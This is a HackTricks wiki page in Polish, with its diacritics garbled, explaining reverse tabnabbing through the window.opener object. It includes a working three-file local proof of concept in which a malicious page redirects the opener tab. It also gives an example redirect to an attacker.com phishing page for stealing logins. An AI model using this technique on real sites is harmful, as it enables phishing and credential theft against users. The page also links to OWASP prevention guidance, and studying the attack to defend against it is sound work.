{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


# Opis

W sytuacji, w kt贸rej **atakujcy** mo偶e **kontrolowa** argument **`href`** tagu **`<a`** z atrybutem **`target="_blank" rel="opener"`**, kt贸ry ma zosta kliknity przez ofiar, **atakujcy** **wskazuje** ten **link** na stron pod swoj kontrol (**zoliwa** **strona**). Nastpnie, gdy **ofiara kliknie** link i uzyska dostp do strony atakujcego, ta **zoliwa** **strona** bdzie moga **kontrolowa** **oryginaln** **stron** za pomoc obiektu javascript **`window.opener`**.\
Jeli strona nie ma **`rel="opener"` ale zawiera `target="_blank"` i nie ma `rel="noopener"`**, mo偶e by r贸wnie偶 podatna.

Zwykym sposobem na nadu偶ycie tego zachowania byoby **zmiana lokalizacji oryginalnej strony** za pomoc `window.opener.location = https://attacker.com/victim.html` na stron kontrolowan przez atakujcego, kt贸ra **wyglda jak oryginalna**, aby moga **imitowa** **formularz logowania** oryginalnej strony i prosi u偶ytkownika o dane logowania.

Nale偶y jednak zauwa偶y, 偶e poniewa偶 **atakujcy teraz mo偶e kontrolowa obiekt okna oryginalnej strony**, mo偶e go nadu偶ywa w inny spos贸b, aby przeprowadza **ukryte ataki** (mo偶e modyfikujc zdarzenia javascript, aby wykrada informacje na serwer kontrolowany przez niego?)

# Przegld

## Z linkiem zwrotnym

Link midzy stronami nadrzdnymi a podrzdnymi, gdy atrybut zapobiegajcy nie jest u偶ywany:

![https://owasp.org/www-community/assets/images/TABNABBING_OVERVIEW_WITH_LINK.png](https://owasp.org/www-community/assets/images/TABNABBING\_OVERVIEW\_WITH\_LINK.png)

## Bez linku zwrotnego

Link midzy stronami nadrzdnymi a podrzdnymi, gdy atrybut zapobiegajcy jest u偶ywany:

![https://owasp.org/www-community/assets/images/TABNABBING_OVERVIEW_WITHOUT_LINK.png](https://owasp.org/www-community/assets/images/TABNABBING\_OVERVIEW\_WITHOUT\_LINK.png)

## Przykady <a href="#examples" id="examples"></a>

Utw贸rz nastpujce strony w folderze i uruchom serwer www za pomoc `python3 -m http.server`\
Nastpnie, **uzyskaj dostp** do `http://127.0.0.1:8000/`vulnerable.html, **kliknij** w link i zauwa偶, jak **oryginalny** **adres URL** **strony** **si zmienia**.

{% code title="vulnerable.html" %}
```markup
<!DOCTYPE html>
<html>
<body>
<h1>Victim Site</h1>
<a href="http://127.0.0.1:8000/malicious.html" target="_blank" rel="opener">Controlled by the attacker</a>
</body>
</html>
```
{% endcode %}

{% code title="malicious.html" %}
```markup
<!DOCTYPE html>
<html>
<body>
<script>
window.opener.location = "http://127.0.0.1:8000/malicious_redir.html";
</script>
</body>
</html>
```
{% endcode %}

{% code title="malicious_redir.html" %}
```markup
<!DOCTYPE html>
<html>
<body>
<h1>New Malicious Site</h1>
</body>
</html>
```
{% endcode %}

## Dostpne waciwoci <a href="#accessible-properties" id="accessible-properties"></a>

W scenariuszu, w kt贸rym wystpuje **cross-origin** (dostp midzy r贸偶nymi domenami), waciwoci instancji klasy JavaScript **window**, do kt贸rej odnosi si obiekt JavaScript **opener**, kt贸re mog by dostpne dla zoliwej witryny, s ograniczone do nastpujcych:

- **`opener.closed`**: Ta waciwo jest u偶ywana do okrelenia, czy okno zostao zamknite, zwracajc warto boolean.
- **`opener.frames`**: Ta waciwo zapewnia dostp do wszystkich element贸w iframe w bie偶cym oknie.
- **`opener.length`**: Liczba element贸w iframe obecnych w bie偶cym oknie jest zwracana przez t waciwo.
- **`opener.opener`**: Referencja do okna, kt贸re otworzyo bie偶ce okno, mo偶e by uzyskana za pomoc tej waciwoci.
- **`opener.parent`**: Ta waciwo zwraca okno nadrzdne bie偶cego okna.
- **`opener.self`**: Ta waciwo zapewnia dostp do samego bie偶cego okna.
- **`opener.top`**: Ta waciwo zwraca najwy偶sze okno przegldarki.

Jednak w przypadkach, gdy domeny s identyczne, zoliwa witryna zyskuje dostp do wszystkich waciwoci udostpnionych przez referencj obiektu JavaScript [**window**](https://developer.mozilla.org/en-US/docs/Web/API/Window).

# Zapobieganie

Informacje o zapobieganiu s udokumentowane w [HTML5 Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5\_Security\_Cheat\_Sheet.html#tabnabbing).

## Odniesienia

* [https://owasp.org/www-community/attacks/Reverse_Tabnabbing](https://owasp.org/www-community/attacks/Reverse_Tabnabbing)

{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si sztuczkami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>
{% endhint %}
